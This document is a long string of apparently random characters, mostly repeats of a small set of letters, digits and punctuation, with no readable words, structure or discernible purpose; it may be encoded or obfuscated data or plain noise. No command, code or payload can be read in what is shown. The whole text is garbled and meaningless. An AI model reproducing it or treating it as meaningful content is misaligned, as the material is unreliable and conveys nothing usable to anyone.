c8vI(>4MD(-I4vDSUnv4(1 4(t4DDr8-r3D4U1S1>crS1vt S8 4r11>tU r8vY I!trS181eUI1-I- vOy4rh>>-tvS(v4 Dv11vI(>4U1>Uvc8 yN*8tU>cU SrS1 tQc4 1181UtSSv88&_IAt1U>-IbSIv> -j84(8I>1UDDvv( 4d>4-1cF(U41UIU c^(441D>UtcS vr 1vI1cI >rU1StvS88f(Gvtt>SU8STcI >*S4c1vrIU>S-vv ({48>1>#vt(S4vD Urv4(I4>1FUScU-.r(D4U1St Ur-1vtS>4 rr11>tUSS8c= 4 (DS18>HUI>>v- v:(vsc>D-tvS(v4 D(-4vI(>4US4Uvc  p44D1U>cU S)u1 tFc4 4r>1ttSSUU}a(14t1S>8UC-Iv> IU84z1I>>t-Svv( 4e>r-1v>(U(SDvU cQ(4rcD>UUcSS-c> (O&DIUIS1 DNSSc8%r411t>SU8S:vI >*-881B>IUr>IIDS-1v8>rDS11r1U8vS->SmIv4ID(vNSp (ItU(4rt> Ur>1vt SO>ccI88F1St8vE I&t4S1U>U1(S>v--vHF4I1(>It>rUSccD)U v1(>4U(I4cDrUc441cU>cU Sv( 8r-11tcS48Ir>1t8 lD14t1S>-rSDvU4cIU>--U84(>IDD ( 4c>4-1v>Sccc(U4-D1 (tcr(USrcv UU}>v4c18orU1Stv>ct1S-8(QUI18tHvI >MS481H>IU4S-vvS(lI4>11->t-rc D t:v4(14>_2rD1(U8c4 IrcD4->Sc88TSD#UrS484tUSr8vX IgrI1D-r-S8D((ID>cU(I1D8-UvS(vct(rrCD-UIcU(-4-D- *rcD1U>cU-1ct c9v1It4 I1Ut>Sv8 Vp  e(4 >1<ttvS8U4(4v8U -cDcvv(t4_>4-1UrUSv-(S44DcU 411cUUcS v84 rr(DItSvU8 rcIDtc-f11tISU8SRv(D(8>r81*IIU>S-vD%-ccc>r 41Sv(>v1S>(8IID4I>SIUUUv -1/c1Ut> UAv1vt SQ-vSc8Ur1>1tI-vv8( >r> -(v xU-cv2s4I1>>-UvS v  DYU4v1(>4Ur-rt1SUrE4R 4D1>t8(v<vrrI(trcr8DtSSI8 ;<144v1rtt- vUw>D tr-4IIc1rvSrI rv1rSDUt(U4>DvU ceS vI(rr8cS8(r 1GU4>rUrSv Dr-ISc0vi8DCIIDtD--IcU41v#rUt1^I >Ur>(J4c>1->vUSScj(8rtD8U4cIDUU1cv  r.H(rD1UU4cr DtctI8(r4 >S (rSU8>I_>{S18>mU >rv- vU_4I1>>1UDcU-vD v4-DDUU4UDIUvc  gcc (r4DrUDS 8Ut8c4 1r>1UtSSv  8r14> S>8UiS(-4U4 tr-t8r>U-Uvv( 4{.I18v>(44SDvU >r-I8t(Dr(1v vrS1BU4c1-IS(v#rtS88!c111t>SUvUtDI >AS4vvH>IU>SUSc-(bIr>1U8vU(S4vI t-v4(I4>DtUSS-  (0IcU1cD Ur-1v1iSEv4pS1>ttSS8c& 4 t4U18IMUI->v-8v*(1I11>USvS(c4 D(-4c-(>4UI4Uvc8 urHD1U>cU S7r1 tJc4 1r>1>tSSUU<H(14t11c8UZ-Iv1 UK84((I>>1-ScI( r -U-1c((Ur DvU ce(4jcD>UIcS Dr 1 U4S G8rU1DtvDI8Crr11t>SU8>c I8>=S4t-X>It>Stvc (w48>1-4vU884v1vv>v4 84>IUUScv  r#I-U1cr UrI1vtvS^8v481>tISSvto I(t4SI8>f1 v>c- v2 8I1>D-Uv>S 48D5-4>-(>4tDS>vt- hr8D1U4cUvSrv4 (8c48(r>1ItS-v8  pI>t1Sr8UnDIv>c-,c4(vI>>I-Svt( rc>4U4c4(U41Dv>>cE(44111t%cS Dr 41U4c1 >(U1rtvSt8C^c11DvSUvUaSI >US4v(b>IU>SUSWU(j4->1tSvU(S4v1vUvv4 S4>1cUScv  B 1tU1Sc UH11vt Sxvair1>>vSScDa IAt4-4v1fU48>vt8vWH4I1D1tBvS  4 Dv-4v1(>r>1rUvS( i(tD1U>cU8UD41 >.c4c_r>1UtS-Sr1?}Irt1Uc8UjSIvDv>c84(4I>>>-Svv( r 1 -1cI(Ur1DvU cB(42(D>UrcS8-r 1LU4c18rrU11tvS 8Brr111)SD8S{tI 1IS48Ib>r>>S-UtM((I4>1>-vU(-4vDS14vr(14>(8UScc  (GP8U1S+ Ur>1v>8S,v4(I1Dt4SS8>+ rrt4-484%UII>vUSv*u4I11>tvvS(D4 D--4SS(>r>1cUvc> Wi1D1U>cU8U641 ttc4v>r>1UtS-Sv^AFIUt1-t8U=SIv> -U84(8I>D -SvS( 4SB!-IcZ(Uv(DvU8cN c41D4ISc- vr (DU4cI >(UPDtvSU8l0 11>DSUcSctI >SS4v M>5(>SUSv>(^4c>1U8vU(S4vI t>v4 84>DrUS-t  (LDrU1S( UrI1v>>SCv4( 1>trSS8Dz I(t4U1v>}UII>v-tvJ(rI11>-4vS(D4 D--4-c(>4U(vUccU =rvD1t(cUvS8t1 tSc48 r>I tSU>S V(Ivt11c8U:-Iv>t-Av c>ID>U-Str( 4(>4U41-(U41DvUUcG(441D>1rc- >r 1(U4cI >/>1>tvSU8) S11t>SUcS(DI >-S4vaX>4t>Stvc (^4c>1U(vUv 4vD t-v4 v4>DUUScv  r&1-U1S( UrI1vt>S0 4K41>t4SS8SH I(t4-4-IVtI1>vt1veX4I1>>tcvS(>4 D(-4v4(>7UDIUvcU orvD1D=cUvSrS1 tSc48 r>4-tSS>vS<lIvt11c8Ul-Iv> -_v c>ID>U-Str( 4(>4U41-(U41Dv>rcO(441I>1IcS >r 1SU4-r >(41-tvSU8Gcv11tDSUcU&vIS44Sr81_> 4>S-cv (v 1>I->vU-(4vD8UpS4S(4>D4UScU  (hD4>1tr Ur11vtUSyvcr1rKttSS8>g  Dt4SI8>8UIS>U1*v(a4I1Qc-Uv-(v4Sr4-rv1(> DDSUcc  S+;D1U>cU82rv18t2S= 1r4(St-Sv8 W>14tIS>8US4Iv> -;8r#1I>>U-Svv( 4N>4Ucv>(U4SDvU1cp(441Y4IU>UUtSS8cun1>UrS>1StUS 8Xr48v}tII>UGvI >uS4815>I1>S-vv --8r(tIrvU(44vD UA> U(cS(IrS18tvSvD4U4c> UrS88CcSR8cr11>tUDS>eS888e8Dct40UI>>v- v2- 8I(4IIvS(-4 Dw-4SIvvc111Uvc  emX8tU>cU SrU1 tgc4v18r1UtSSv8 !CIct1S>c>h-Ic> -g84x1I>D>vXvv(v46D(-1v>(UrU8(U c8(4r D>UUcSvv8-1ut(c1 IrU14tv-vr>r4I;t>-(8SLvI >kI(8IdIIU>U-vvv(ir4r(->vD(S4-D U v4(18tDUU>cv  rsD4U1S9c(r-1tt S( 4rI1>t1SS8v II(t4S181CUIS>v- SDxrI1>>-UvS(v4 DH>tvI(>4UD-Uvc  x444-UDcU Sr-1 tJc484tt1UtDSv88nl14t1-gS(V-It> -,84CII>>t-Svv8I4(>4-1v1(U4SDvtv4r(4r(D>UIcS vr I *Dc1 rrU1DtvS 80r44DtDSI8S0cI >(S481- IU>S-vv8(?I4>1->v>(S4vD U v4(14>DUU>cv  rs8c4I18t1rS1tt SA 4S1 IrtI >dEIIEt4S1v1UcIS>v- v(/4I1>>-U{r(v4 De-rv1(14UD1SDc  d441(U>ct Src1 tv>1 Ir>1UtDSv88gLI 4>SD8U0SI4> -(84(4c->U-Svv(v45>4-1c9v(4-DcU cE(44ID>UtcS v>>1iU4c1 >rU1StvS 81r411t>S>8S,cI >vD18I&>IU>S-vv8({I4(v->vU(S4cD Ubv4(14DDUUScv vr^D4U1c> UrS1vt SH8Ur11>tUD>Uvcv8c( 4(>1-S8D(S->v374I1D1rcvS(v4 D -4v1(>4UIcUcc  *4rD1UDcU Sc 1 tKc4 1r>1UtSU>88nG14t1-(8Us-Iv>8-Nv c>ID>U-SvD( 4(>4U41-(U4SDvUvc^(441D>>-c- vr 1(U4cI >rU 4tvS 85rr11t>SU8SyvI >hS4cSl>IU>S-vv1(AI4>11vtDSc8 rS4cD(UDv4(IUSU8  r0D4DD1IUISU8>r-I >( D(>?I1U>_SD88IIIr>t->v>r84v>v-8v44-DtDt--fU(14-DtU8c1r8DcU c!(v(rrr1>ttS88v1Ic4c8r>1UtSt8>cScvk( 1r>>-tg8r 4c>9-Uv83DDcD-U(c   1DD1-1vD SDrt(t(vr4nrvDrt(cD8v1DUIc> U1SttS 8ur481rI1t> -oI >-S481j> %(>4UD c-v8 N-1vU (4vD U6tStwc4 UItDttvSS -4rDr Ur41vt SC> SD8I:1IUtI-!8->(S18>HUIS>v- 8lvII1>4-UvS(vct((4-1J(I4UDSUvc  }44111>cU 1rv1 tE1-t>SI IzUIU8   14t1S>>/->vU( 48-U8DAtOrI-D(--c8I144Dt->c  8r>-4U(cD -D-11cc ( -4r1tUrSDrctvS-8Tr411_>1ttr-Svc>%-*81/>IUirIUv (4I4>1->DS-Dc1 SIj>rU8vrrDrD1Stccr8<U1c4 UrS1vrt1(tDS(1DttSS8UX IZt4IKtD-18->v-Svs<4I1(U4ID U54 DP-4v1(>4DDSUvc  m44D1U>cU Srt1 tlc4>zcD >P 1t8 0>14t1S>>cS-v1r I1trUc8r(>4tvv(>4N>4-1D4U-cv t4rD U8c4D>UrcS vr 8.r>DI>8S(8vrDI(8Or411t>1S8SfcI >TS4815>r4>--vv8(%4 >1-DvU D4vDS14vr(14>D1UScc  rvp1UIc> U,-1vt8S)vW-t1>ttSSvcQ ICt4U1SvFtI->v-8vH(cI11>UDvS(c4 D(-4vI(>r>11Uvcc LrrD1U>cUvSr-1 t8c4 rr>1ItS-SvcbdI8t1--8UWSIv> US84( I>>t-Svv( r 1t-1c((U4tDvU cX(441D>UIcS tr 1-U4c18rrU1ttvS-8Rr411t>-48SecI >YS4843>IUD(-vv (EIr>1->vU(>rRD UXv48>4>DtUSSStrruDrU1SD UrS1vD U> rrI1>ttSS8D3 rP> S18DkUI->v-8v; art>>-DvS c4 DA-4S18-4UDtUvcc &r8D1t1c> Srt1 tIc4 1r>1U>(Sv8ULn1rt1S>8U(U41> --84L4I>>U-Svvc14(DS-1v>(U4SDvU c1(4r(D>UIcS 1r 1Wt>c1 IrU1DtvS 8+r44ct>St8SbvI > S481 vIU>S-vv8(5I4>1U1( (S4cD tcv4(14>IU1Dcv vr,D4U1S> Ur1>Dt S  4(r1>ttSS8c% Iv41SI8>lUrt>v-8vy(  >>D-UvSvC4 D(-4S1cr4UDUUvc  zr4D1DYrv SrS1 D-c4 Ir>I1tSSUU:2(14t1t(8U#-Iv>SD48r{1I>Iv-Svc( _Jr8-1v1(U4SDvt cHvv4ID>U>cScYr 1(U4S  >r1(vtcS 8T >11tDSUcSvtI > S481)>4U>S-vvc(24Q>1->vU(S4v1vv>v4(44>14UScv  X 8DU1cI Uuv1vt STv4v(1>t1SS8vA 48t4S1cIWtIt>v-vv9(8I1>41Sv-(v4 (1-4vI(>4U3cUvc> %4rD1U>cU8U8>1 ttc48vr>1UtSUv8r5uIUt1-(8U(cIv> - 84(cI>>>-SvS( 4)1--1vD(U4rDvU c_8C4ID>t(cS8Ir 1fU4-18crUIQtvSt8i(S11t>-c8SBII > S484/>4>>4-vv1(sr->1->vU8S4-D UDv4 84>I UScv 4r%1UU1c1 UrU1vtUS- 4sS1>BvSS8c5 Itt4-YUUstIS>vI4v7RrI1D1rcvS(I4 D4-4v1(>4U(vUvc1 6rhD1U>cU S(-18ttc4 4r>I8tSSUU5{(14t1188UN-Iv1U-(84Q4I>r8-Svc( rS>4UbtU(t4SDv1Ic_(r4111{ccS8 r 1UU4c1 >rU>Ptv-(8p+D11t>SU8SS-I8>4S4843>I>>S->tv((Ir>1I vU(-4v1AUJc S>4DDUUS>1  r(D4U1>t Ur41vt SE 4r1144SS-8v)  Ut4SI8>(>c8>vUpv5 -I1>>-UvS- 4 Dr-4vr(>4UDSUvDc (r1D1U1cU UrvIvgIc48Dr>4(tSSv8 Fu>Ut1->8U(8Iv> -Q84SrIDD--SvS( 4 >4U (-(UrvDvI>c%(r411tUUc>- r81XU4Dv >rt1S>SIr8Lk111t4SU8SwvIU1tSrvD,>IU>S-cv ( I4>18 vU(S4vDvU9v4(14>-:UScv  r8D4U1c> Uct1c>dSz8Xr111tUUSr8: I t4S48>((IS>>UvvK(-I141-Uv-(v4vD;U t>(D4UDS1Sc  (444  ScU 4rv 4tjcr 1u11Ut>D 88Td14JUS>8tOS4S(r-Cv-O1r(>U-Svv8 vc>4Ucv> (4S13U cf D411vUUcU vr 1oU4S8 >!81StcS 8jr411>USU8rkvII>dSr81(14r>S-Iv (>I4>1->vU h4vDDU/vr(14DDUtU-(  rtD4t_c> UrS1>DDS(8Ur11DtUS-8v{vI=t4 v8>hUIS>c- vgi4I1Ic-tvS(v48Do-4v1(>v D-UIc   44DIU>S> rrv1DtgSU 1r>1U>U 48 ^>14>-S>8U&SIv>4-Kv-}1I1>U--vv(Ur >4-rv>vt4SDcU c (4rRmUUtcS v 81ZUrc1 >S01StvS 8(r411t>SU8UEvI >F-381F>IU>S-tv (:I4 3ID>>U vtD USv4(14> (rv1-U-S 8 tvc> UrS1vDvS( 4r11>tUSS8vC I8t4S18>!UIS>v- c UDI1>>-Uv-(v4 Dst4t((>4UDSUvc   44D14UcU -rv1 tFc4 1r> StSSS8 h(14t1S>8UrSIv> -3vx?1ID>U-S>1( 4*>4-Iv>(U4SDvU cB(4411(UUcS vr 1rU4c1 >v1 D5P1->+SI8474DDtD-SvUNtI(>(!>Ir>S-vv S,v>;Ir8>IUUc-D UDv4(14>fvrcD-U8c124rUDD>(cD8St Sv 4r11>%r1-tI-SIB>US18>eU(IAt4St8-8v4 F4(>t-t4 1--4v1(>81(Dr*D-tHcI 4r4>1tcvv 4r(1(t(v88S!tIUt8S48(%(S>81ZSIv> I-tr-t8rDS-Svv( r c4-1v>(U4>DvU ch(4rDD>UUcS cr 1(U4S4v8rU1StvSt8Vr411D>--8S=vI >/S4v(h>4>DI-vvv(9Ir>1->vU(SIID U<v4(44>D>US-v 4rBD4U1c> Ur11vt D4 4r41>tUSS8v{ Iu-8S18I{UI->v- v3 <4>>>-1vS(D4 D=-4S1 r4UD>UvcS =r<D1>>cr SrU1 tvc4 rr>1UtDSv8 AJI t1SD8UsSID> -N84XII>>U-Svv( 45>4-1c (U4SDvU Sv(441D>1t1DtUS(4s4(1(tUc14S4v1->v(4.Ih4I1t-S-8I>,-v81X>IUrv48Dv-I8r(U->v>(S4vD Irtc(1rMDUUScvSccr 1r 18UrrS1rt S0 48I84n11-t-SIrY4DIDt4SIIS>t- vA<4v1hIItD UW4 Dv-4v1(>cr(-4I1S nrcD1U>cUUIct8Sr-18t>-VI4tSSv8 ( vDt1S>8U,IIv> -/84IcI>>U-Svc( 4 >4U  8(U4SDvt-cA(r41D>UUc>- r81&U4-( >rt1S>SIr8dr411> SU8S7vI StS481y>It>S-Sv 8e 8>1->vU(S4vDSU^S4S(4>DUUScv  r(D4t v( UrS1vtIS! rr11DtUS>U g8I^t4--8>VtIS>U1gv(04I1>>-Uv-(vrv I-4v1(>4DDSUvc vE88D1U>cU Srv1-twUv Ir>1UtS-v8 ;(14t4S>81cvIc> -lv4x1ID>U->t (84{>4-1v>(t4S1SrrcH(4411dUUcS vrU4tUrcI >rU1StcS 8(r411c SU8STvI >jS481V>4v>S-vv ( I4>I->v1Sv4cD UKv4(14DDUUSD1  rVD4UIc> UrS1vt8Sd 4r1rUtUSS8vw IDt4S18>vr8D(UDc>U--vUB44>>DU 4 D--4v1(>vr(DrUDtUcc18 U>c4 Srv1 I(I >WcD DT(Sv88gC14t1-(8U(-Iv> -?tM-(v>(vIr>--8cv(84*tIU1cc S48D-U84ID>UUSz vr 1:Ic1(t4vD DoSIUttS(8(t>-U8S/vI 4U48>tSDvS(cII>SS vI(D44tU--cS SUOcU(14>DU1-1UtSc( (r->4>(SS tt Sc 4r11>IIIvttSrvtt4-v8>kUISrv4(D8--cb(84-Dv(v4UD.-4v1cIc- v4>DDU-441 U>cU Svv -xv>4tDSI1U>wSv8 Yo(v/cI1tIct8t(v4S>8-4I>>t-Svv( 4c>4-Iv>(U4SDIU cv(441D>IUDDtUSc1gt8c1 >rUkD2>1-t4- 1rt>SU8S^vI >mS4-1KIIU>S-vv (yI4>1->vU(r4vD UGtSU(vD vr>D1Svc(8ZU1c4 UrS1vrt1(tDS(1>t4SS8vK  rrIDttD-(vv>v-SvT/4I1rUItD8-t4 D--4v1(>8U  4c1DUcSV rU>S1 Srv1 I(I8>6St4U4t1t>)Sv44411r>1 S(c(S4vtrSrvc>U-rvv( 4dr-4>1m-Icv Ur(1 t-4rD>UUcS vr 1Z-4tD >fv1StvS U-cr8c_4>4>c-S(cjUI->US4IU>D-vv (Cv4kI48D>Ut4vDSUov4(1S((t4r1U  rtD4U1c>U-cc7t761ctDSc r9DSS8>d Iat44(>U-U8-E-IIvp(-I1>>-UDIU8cv(Dr(D1-DvD(DUvc1 e44D1111>UrcU trc>1t(S4r>tSSD8 fQ144(IUttSUvlE-Iv84(DI>>U-S>U-8cvPr14>rUccc U4-tctvc( Ur1cS Ir 1hU4>tUDcr8vrIIS>cS 8(t>-88SpvI 41IItrSDvvrS4H>8Utv8(4-IvU(S4vD Usv4Sc >DUUrcv  rME(rvDDt>c- -MS1c>;r1IctUSS8vS48crrI/tr->vt(UI8DvU(II>D-Uv1(v4 Di1(DUU8vI vrUc  844D1U>ttt SL1 t(c4 1r>I D Sc8 C,4Y(tS>8UpSr > -R84(4c->U--vv U4G>4-1S> U4SDcU c((4r8D>t> Z vrc1;>-c1 >rU1S>IS 8(r41rt>S>8S v(->=Sr81BDIU1I-vS ccI4>I->vt(Sa4D >Tt8(14DDUU-cv8Ir5I4I(c> trS1ct -( 4(1I>tUS-8vf8IstrS18>89IS>c- v f4I1>>-US((v4 DM-4v1(14UD>I c8 n44IcUDct SCS8rtXS8 1(U1UtSSvvv(v1r> S>v4_SIv> t*vvb147>U-1vv8v4u14U-v>(44SD>U S-(4<1ISUUc1 vrU1<>4c1v>%t1St>S 8Sr4rUt>UUvUTvIU>7-v81hDIU>SU{v (SI4D8->vU(S4v1IUHc8(14>DUUIcv S84DrU1c>8rr-1ct UC-8r1IvtUSr8vb>I.D41(8>( IS>4- vD;444>1-Uc((vrUDB-4v18>rcDSUrc  D44IcU>-U81rv1ItMSt 1 (1UDSSr8 %D14>-S>S(lSrv>8-Gvt/14c>U-4vv8 rI>4U-v> 84SDrU c<-14I1vUUS_ vrI1L>4>( >2 1St4S cSr4r t-SUvQxvrS>WSr818 IU>>1 v8(dI4IR->vt(S4UP*U(v4(1%(DtU-cv8vD>D4tSc>81rS1vt S78(r1IvtUSS8ve IeD4D(8>( IS>I- ccd4r14r-UcC(v41DB> v1vlUvDSU4c 8-4rDIU>U8 SrU(nt(c4 1((1tt-Sv8 c414>SS>8UFSIv> tS8r614v>U>vvv(84H1 -1v4SS4-DvU -4(44ID>U1>v cr 1Y>ccI DrU1SDSS88>r411t>St8SXvrv>(-t81<>IU>U-vv 8 IrDU->vU(S4UD Uu-d(Ir-DUUScv Sr3I4I(c>8SrS1Ut -U 4(1IVtt-c8v_DIE>SS1c>(IISD8- vrf44->>-UcD(v4rD5U1v1 t4UISUSc  4441EU>-x S(vIrtXSI 1{81Ut4Svc K-14>DS>v-ESIr> -5v-%14->UUvvv (4&141(v> S4SDUU SU(4Q11BUtSc vrD1=tSc1v>f 1S>8S 8rr4I-t>SUv>)vIr>*-181(tIU1SU(v (4I4Dn->S6(Sev1vU0cI(1r8DUU4cvv lvD4tDc>8-rS1rt Sjvvr1I-tU-v8v((I*>4i48>(vISD(- vI34m11c-Uc (v4DDT>Dv1v>p DStyc 8 44DrU>-U 4rv1rthS- 1( 1U>S-I8 +114>SS>vcCS4v>4-RvtL1rS>UU vvv rS>4U-v> D4SDUU S38t411vUU-  vrI1B>^Sc DV81S>>S 8?r441>ISUv(yvII>^-c81(141>SU(v (cI4>1->vU8 4vDIUzcD(141DU>SSI  rDD4t-c>vcrSISt8S&8Dr14ItUSS8vh 4Dt4--8>(cIS>S- Si(4I1Dc-Uc((vrrD&t+Sr(>rcDS>tc  V44D1tDcU8(rv1rtsSQ 1(>I-tSSr8 VD14>>S>v>(AIv>r-?crE1I>>U-Sv>( 44>4USv>(U4SDvt8c6 D411UUUcS vr 1>U4S- >rU1StcS 8/8411>cSU8SJvI8>pS4cAL>4v>S-vv ( I4>1U>vU 84vD U7c (14>14USS   rjD4t{c>vUK81v>(S38 r14 tUUS8>!84kt4-c8>(zIS1vUUvh(4I1D>-Uc((v4 1 -4c>(>r-DStvc vuw D1ttcU >rvI>t_-48cr>IUtSSI8 zU14D1-t8U(SIvD -:vtj1I>DS-Sc ( 4r>4U1v>8U DDvt(c_  41I UU-S >r8IWU4Sc >Z01SDv-I8jA411>>SUv(&vI D1S4v>}>4->SUvv 8_41>1UtvU(>4v1>UFS4 c4>1UUScI  rUD4>1SU UoS1v> S{8tr11>>2SSv R Irt4-18>(U-U>v-rvk(DI1DU-U-S  4 DI-4cc(>(cDSDvcD erDD1t1cU trv4 t c48>r>I(tS-18 (G48t1--8U(5IvDl-6v4LrI>Dv-SSE( 4I>4>1S (Ur Dvtccg  411>>(cS rr I1U4SU >k>1rtcS48Q(v11t>SUcS(tI >1S4vUG>Ir>SUSc((E41>1-rvU(S4vD t1v4 U4>1SUScS  (WItU1SS Uu 1v>rSsv<(f1>>SSSc-^ Ipt4S18rlU4 >vUmv#(pI11>UUvS n4 D1-4St(>r>ItUvS{ f(8D1U>cU Sx>1 t1c48>r>1>tSUvvto<I>t1-S8U(vIvDvU_84(>I>1t-Svv( 4=1D-1ct(Ur(DvU cl(44rD>tScS88r 1}U4c1v3rUI tvS 83rr11t>>U8S(KI >VS48Ie>IU>t-vvr(#I4>1-1vU(SMED U4v4(14>D1UScv8irQ1IU1c> Ur>1vD S> 4F11>t1SSv1C ri>vSIvDnUIr>v->v? 448>>UtvS c4 DD-4v1 r4U1cUvS  WrrD1>>-V S}v1 tvc4vvr>4U>tSvv8u/I-t1- 8U Srh> U(84(II>D8-Svv t4/DI-1c>(Ur-Dv> tc(4r1D>U1cS81r 4ltvcI8DrU1rtvS>8m(414t>-t8S(cI >DS481 BIUDc-vc (d4r>1t>c (SrvD Uvv48v4>IUUDcv88r%1-U1S  U(S11t -( 4oI1>>8SS8vhrIa>IS1v>bU4->vU 4 H44>>>UcvS 84 4btJv1 U4UDrUv-r m(41 U>SS SeS1 t8c4v1rI1U>cSv8D+f4St1->8>uS4 > ->84(DI>DUU1vv(r4=1>-1cU(U(S1UU cI(4rrD>t-cS8vrU1Ot>c1vSrUI8tv-v8trrItt>-48S^vI 1jUv81(-IUD8-vvt(LrFDD->c-(S4tD U_v4(1r>DUt8cv8(r!1}U1->8UrSI(t SI 4(t1>>>-t8v((IA1(S18>^UISD8- vIf44D>>->vS8vr D,UDv1 -4UI8UvSvv8441DU>-I Srv1 tM-D 1n-1U>cSv8vCl44>-S>vc)S4(> -484(44 >UUcvv884y>4-1v>884S1vU c1(441D>UUc1 v:(1/t4c1 >rU1S>vS 8Ir411t>St8Sev( >K-D81o>IU>--vv (vI4D>->vU(S4SD U)S (1rtDUUScv Sr5D4t3c>8UrS1vt Sv 4(1IUtU--8vfSIZDSS1c>;4I-DS- vtZ44v>>tUc4(vrvDXtnv1 c4UDSUtc 8!441IU>S> S(v1DtdSr 1r41U>4Svc zI14>4S>v(YSI1> tFcvB141>UUUvv(I4%>4t-v> U4S1cU S (4,1rrUUS- vrS1J>Sc1v>r41->SS 8tr4Ivt>UU8I}v4v>HUO81(cIU>SUUv  5I4DI->c>(SQv1SU_cr(144DUt4cvv rrD4t4c>8(rS11t U;81r1I1tU-U8v{IIot4-c8>(UISDc- c d441v1-Ucc(v4rDXU4v1v>rtDSt8c  t444tU>UU84rvI(td-a 1rI1UDS-v8 (_14>cS>c.FS4v>8-mvIY14v>UUSvv  4->4U>v>8v4S18U UH8(411UUUSt v E1yt4Sc >}c1SD;S 84r4I4>8Stvvev4U>}S481 >4r>SU v (4I4D8->c> t4v1 Ulc8(14>DUUSSD  r4D4t1c> >rS4vt4SQ81r1IUtUU88v(v4ct4-18> DIS>v- v5 8I1DU-UcS(v4vDot4c1(>rSDSt c 8I4414>IcU8Srv4-tAc4 1r>I(tS- 8 (u14t4S>cUx-IvD2-fv1k14U>UUUc(( r,>4tIv>(U4SDvtNc+ r411-UUcS vr 1-U4S1 >Xt1StvS 8odc11>USU8SMvI8>/S4-1z>4S>S-vv ((I4>1U vU c4vD U0c7(14>1DUSSv  rWD4tGc> Un11v>8S* 4r114tUUSvcp 4 t4-l8> jIS1v-Uv( (I1D8-Uv4(vL D>-4cr(>rDDSUrc  WrrD1tDcU8UrvIct0-4v(r>I>tSSU8 (U14D1U(8U(tIv>D-GvSb1r>Du-Sc-( r8>4U-v>(Ur-Dvt8cp8R411IUU-SStr I U4S. >(?1SDvSU8(((11>8SU84Hvr D(S4vry>4D>S-rv (dIr>1UDvU U4v1cUfS48 4>1>UScU  5UD4>1S> UOt1vtDS:8Sr14>>-SSv-} 48t4--8>ZUI->vU8v) mI1DI-UcSDS4 1u-4ct(>rtDSDvcS Wr4D1t8cUc8rvr >1c481r>I>tSS-8  7Ict1-D8UVrIvD>-ev4 vI>DU-Sv4( r(>4U1Sc(UrcDvt4c& 4414>>%cS88r I8U4S1 >/UIStv-V8d(>11>tSUvUWII8>rS4c .>IU>StvcD(e4I>1UtvU(I4v1vttv4 I4>DIUScv  rP1_U1St Uk-1vtvSmv4a 1>>-SSv8Z 4It4-4vR_U4->vtcvx:4I1>>-rvS 84 1(-4v4(>hU1SUvS( prID1>-cU8U(-1 >(c4c(r>1UtSSvvUM&IIt1-D8UbUIv1 -r84(DI>D--Sc ( r D4-1cD(U7-DvU cm(4r>D>t>cS8 r 1;U4c1v rUI-tv-v8Gr411t>Uc8S(8I >bS48I)>4>-b-vc((;r>>1->vU(S4-D Urv4(14>DUUSSStrr<1IU1-t UrS1v>v > 4#11>>DSS8vh IzrUSIvtQUIU>v-8vX d4(>>U-vS(S4 DE-4v1484U1cUvc8 urpD1>>tI So81 trc48Ur>4UIDSvv(^pIIt1Uv8Uf1>I> -r84 8ID>t-Svv( 4vr1-Iv>(UrIDcU8cF848(D>t-cS Ir IcU4-1SrrUIctv-(8H  111;St8S(8I D-Sr8Im>I4>S-UtB((I4>1t(vt(-4vD I4v4 D4>DUUScv  (Sc>U1St U v1vt8S&v r1144SS-8vE r4t4SI8>/44U>v--vY cI1>D-UvU(v4Sr4-rv1(>rrDSUcc  SQ;D1U>cU88rv18tWS! 1r4(St-Sv8 gI14tIS>8US4Iv> -s8r)1I>>U-Svv( 4F>4U(v>(U4SDvtDcf(441rDrI1>t8( yS4r14t-(U8 _ 1Utc-d8>rDIvcSv-88(84 >USrIU>I-vv (Tvc((44>r-Dc  UU7c (14>DUrIDcUDSvD4t(c> UrS8vrc1(t>SU1>t4SS8vd (83II>>9-(8IDv- v6J444 --UvS(v4cDw-4v1(>D(DSUvc  (44D4U>c4;Irv1 tKS8 1rD1Ut-Sv8Sv41rt1S>8I5SIc> -vU1oII>>UUcvv(84&1%rtv>(U4SDSU cW(441U8UUcS vr81Ft,c1v>8I1StvS 8ir4I(t>UU-DHvI >JS481wDIU>1vIv (RI4>1->vt(S4vD Uvt1(I4>DUUScv 8r=Ix:tc> UrS1Ut S* 4r42 tUS-8vy Ist4S18>(vIS>v- v A4II>>-1tv(c4 D}-4v1(D4UDS41c  X44DIU>cU Srv18tac4 1;v1UtSSv8 yS14t1S>t-Sc (O8It>1M14t>U-SvvS c (IrvD8Ucvr UrD>xtGcD -rU1> -r 1!U4c1 >S D4IvS 8cr411t>IUt-SIvv(8S4vr}>IU>SI>>DU v8(141D-U4vI(r4t1 tcc> >rc1(t SvD4t>c> UrS_Dr-Iv- S(8IrD1D> SS8(Y14_>I.UIr>v- vjUcvD(148DtUvv8(848v1(44UDSUvDtU(cD (U>cr Srv1 4rDIU8St8>< 1U8 Tv14t1S>USS-v(*-U884h1I>D>r8vv( 4ZD -1v>(UrU8(U c((4rvD>UUcSvv8-1eUrc1 DrU1ItvU -cr41It>St8SHcI 1aD881oDIU>--vvD(0r4D1->vt(S4cD USv4(1( DUU-cv vrkD4U1c>v8rS1vt S. 4r41>t1Dv8c6 Il>4S18D3UrS4t- vcQ44%>>U vS8>-4DmU8v1 >4UD-Uvcv Xr Q>UDcU S_v1 t(c484--1UtDSv8-/V14t1S>( #SI>> -v84}1I>D>vAvv(t4GD(-1v>(U4S>vU cc(4r8D>UtcS >/v1CU4c188rU1-tvSv8m: (>tDSU8S:II >(S481- IU>S-vv8(mI4>1->vU(S4vD Uvv4(14>DUU>cv  r! c4I1-UIrS14t S< 4v8 rJ1Dttt-vvSh-1rtr5U4(>v- v:cSc+(44Utt-tcv S4->r-r4U16Uvc  ;8U&rIt>SS>ct crr1 t(e81UtSSvvv-I14tIS>8tfSIv> t^v4d1ID>U--vv(v4n1MvSv>(D4SD-U cY(441D8UUc- vrc1#t9c1v>j 1StcS 8(r4IJt>SU(nevIc>&S481,>IU>SI8v8((I4>r->vU(S4v 4Ubvr(14>DUUScv  cUD4U1c> trS1vt S( 4r11>tU-D8v2 IKt4SI8>!UIS>4-cvV%4I1>>-UvS3v (DjUIv1(>4U(>4c1SU(vJ (r-1-t>cta-gS18t>S41U>YSv8 i!(vQcI1tIct8t(v4S>8-4I>DS-Svv( 88(84U>r-Dc>IvItDc-rc1 trS1t vr81=U4c188rU11tvS 8z-88>_>1tttSrI >vS4810> ((>It>r(K4r>1->vUSUvt  41D--rvD 14DDU-cSv Ir4DDUrcD1vtSSC 4r18(rtI8tty I>t4S18>vr8D(U1c>cUsc 